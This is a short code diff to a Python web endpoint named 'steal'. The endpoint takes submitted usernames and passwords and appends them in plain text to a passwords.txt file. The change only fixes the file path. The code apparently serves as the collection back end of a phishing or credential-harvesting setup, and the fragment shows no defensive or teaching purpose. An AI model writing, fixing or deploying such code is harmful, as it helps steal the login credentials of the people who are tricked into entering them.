@@ -19,7 +19,11 @@ async def steal(request: Request):
     username = data.get("username", "")
     password = data.get("password", "")
 
-    with open("passwords.txt", "a", encoding="utf-8") as f:
+    base_dir = Path(__file__).resolve().parent
+    
+    file_path = base_dir / "passwords.txt"
+
+    with open(file_path, "a", encoding="utf-8") as f:
         f.write(f"username={username}, password={password}\n")
 
     return {"status": "ok"}
